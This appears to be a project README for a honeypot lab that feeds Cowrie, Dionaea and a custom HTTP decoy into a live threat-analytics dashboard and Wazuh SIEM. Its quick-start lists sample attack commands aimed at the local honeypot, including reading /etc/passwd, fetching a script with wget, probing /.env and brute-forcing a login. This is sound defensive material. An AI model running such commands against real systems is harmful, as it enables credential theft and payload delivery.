# Multi-protocol Honeypot & Real-Time Threat Analytics

A deception-based intrusion detection lab: three internet-facing decoy sensors — **Cowrie**
(SSH/Telnet), **Dionaea** (SMB/FTP/HTTP/MSSQL/MySQL/malware), and **WebTrap**, a
**self-written HTTP honeypot** that serves fake admin/login panels — feed a custom
**real-time analytics pipeline** that detects, enriches, scores and visualises every attack,
with a **Wazuh SIEM** integration path for production.

Attackers think they've found a vulnerable server. Every login they try, every command they
run, and every payload they attempt to drop is captured, classified against MITRE ATT&CK, and
streamed to a live dashboard.

![stack](docs/architecture.svg)

---

## Two ways to run it

| Mode | What runs | Use for |
|------|-----------|---------|
| **Local stack** (`docker compose`) | Cowrie + Dionaea + custom analytics service | development, demos, this repo's dashboard |
| **Production SIEM** (`scripts/`) | Honeypots + Wazuh Manager/Indexer/Dashboard across VMs/VPS | internet-exposed sensor with the full Wazuh stack |

Both share the same detection logic — the analytics service ports the exact rules in
[`config/cowrie_rules.xml`](config/cowrie_rules.xml) and [`config/dionaea_rules.xml`](config/dionaea_rules.xml)
that the Wazuh manager loads in production.

---

## Quick start (local)

Requires Docker Desktop / Docker Engine + Compose.

```bash
git clone https://github.com/Discord-05/honeypot-wazuh-project.git
cd honeypot-wazuh-project
cp .env.example .env            # optional: add threat-intel / alert keys
docker compose up -d --build
```

Open **http://localhost:8080**.

No live attackers yet? Click **▶ Simulate attack** on the dashboard (or
`curl -X POST "http://localhost:8080/api/simulate?sessions=10"`) to replay realistic attack
sessions from real-world scanner IPs so the charts, geo-map and enrichment populate.

Drive a **real** attack against the honeypot instead:

```bash
# SSH (Cowrie) — accepts weak creds by design
ssh admin@localhost -p 2222      # password: admin
# then, inside the fake shell:
uname -a; cat /etc/passwd; wget http://example.com/x.sh

# FTP (Dionaea) — credentials are captured on the dashboard
curl --user root:password ftp://localhost:2121/

# HTTP (WebTrap, the self-written honeypot) — path, User-Agent + creds captured
curl http://localhost:8090/.env
curl -A "sqlmap/1.7" http://localhost:8090/wp-login.php
curl -X POST http://localhost:8090/wp-login.php -d "log=admin&pwd=admin"
```

Watch each one appear in the live feed within a second — tagged with its
protocol — and light up the **Protocol coverage** panel.

---

## Features

**Honeypots**
- Cowrie — medium-interaction SSH/Telnet, full fake shell, captures credentials, commands, TTY sessions, downloads
- Dionaea — SMB/FTP/HTTP/MSSQL/MySQL, captures exploit attempts and malware samples
- **WebTrap** (`webhoneypot/`) — **self-written** low-interaction HTTP honeypot; serves decoy
  WordPress / phpMyAdmin / admin panels and exposed `.env` / `.git`, and captures every request
  path, User-Agent, and submitted credential as clean JSON (a sensor built for this project, not
  off-the-shelf)

**Analytics pipeline** (`ingest/`)
- Tails honeypot logs in real time and normalises events, tagging each with the **sensor** that caught it (`honeypot`) and the **service the attacker actually spoke** (`protocol`: ssh, telnet, ftp, http, smb, mssql, mysql, …)
- **Per-protocol detection engine** — applies the project's Wazuh rules: severity levels, rule IDs, MITRE ATT&CK technique + tactic. Separate correlation trackers for SSH brute force, FTP brute force, and aggressive multi-service scanning
- **Dionaea deep parsing** — reconstructs each accepted connection's protocol from its port, and captures FTP login credentials (`USER`/`PASS`) and file-transfer commands, not just "a connection happened"
- **Threat-intel enrichment** — GeoIP (ip-api), optional AbuseIPDB reputation + Tor flags
- **Live dashboard** — KPIs (incl. protocols hit), **protocol-coverage panel**, activity chart, MITRE breakdown, attacker geo-map, top IPs/credentials/commands, and a WebSocket event feed filterable by severity **and protocol**
- **Alerting** — Telegram + email on high-severity events (optional)
- **Reporting** — auto-generated HTML/PDF-ready threat reports (with a protocol-coverage table)

**SIEM integration** (`config/`, `scripts/`)
- Custom Wazuh decoders/rules, agent config, all-in-one installer

---

## Architecture

```
                          attackers
                              │
        ┌─────────────────────┼─────────────────────┐
        ▼                     ▼                     ▼
   ┌─────────┐          ┌─────────┐          ┌──────────┐
   │ Cowrie  │ SSH/Tel  │ Dionaea │ SMB/FTP  │ WebTrap  │ HTTP
   │ :2222/3 │          │ :445…   │ HTTP/DB  │  :8090   │ (self-written)
   └────┬────┘          └────┬────┘          └────┬─────┘
        │ cowrie.json        │ dionaea.log        │ webtrap.json
        └──────────┬─────────┴────────────────────┘   (shared Docker volumes)
                   ▼
        ┌───────────────────────────┐
        │   analytics service        │   FastAPI (ingest/)
        │  tail → detect → enrich →  │   detection rules generated from the
        │  store(SQLite) → broadcast │   same Wazuh XML (scripts/gen_rules.py)
        └───────────┬───────────────┘
             REST + │ WebSocket
                    ▼
        ┌───────────────────────────┐
        │   live dashboard  :8080    │
        └───────────────────────────┘
```

Full detail: [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md).
Server-side & cloud deployment (incl. full Wazuh SIEM): [docs/DEPLOYMENT.md](docs/DEPLOYMENT.md).

---

## API

| Endpoint | Purpose |
|----------|---------|
| `GET /api/summary` | KPI counters |
| `GET /api/events?limit=&min_level=&protocol=` | recent events (optionally filtered by protocol) |
| `GET /api/alerts` | alerts grouped by rule |
| `GET /api/mitre` | MITRE technique breakdown |
| `GET /api/timeseries` | activity over time |
| `GET /api/ips` / `GET /api/geo` | enriched attacker IPs |
| `GET /api/credentials` / `GET /api/commands` | brute-force + command stats |
| `POST /api/simulate?sessions=N` | replay synthetic attack traffic |
| `GET /api/report` | download an HTML threat report |
| `WS /ws` | live event stream |

---

## Security notice

Honeypots are intentionally vulnerable. **Never** run them on a network you can't isolate, and
never expose the analytics dashboard (`:8080`) to the public internet without authentication.
The dashboard ships with **optional HTTP Basic auth** — set `DASH_USER`/`DASH_PASS` (see
[`.env.example`](.env.example)) to require a login on everything but `/api/health`. Set
`RETENTION_DAYS` to cap how long captured events are kept. See
[docs/DEPLOYMENT.md](docs/DEPLOYMENT.md) for further hardening guidance. For educational and
authorised research use only.

## Tests

```bash
cd ingest
pip install -r requirements-dev.txt
python -m pytest -q          # detection-engine unit tests
```

CI (GitHub Actions) runs these tests and builds the image on every push — see
[`.github/workflows/ci.yml`](.github/workflows/ci.yml).
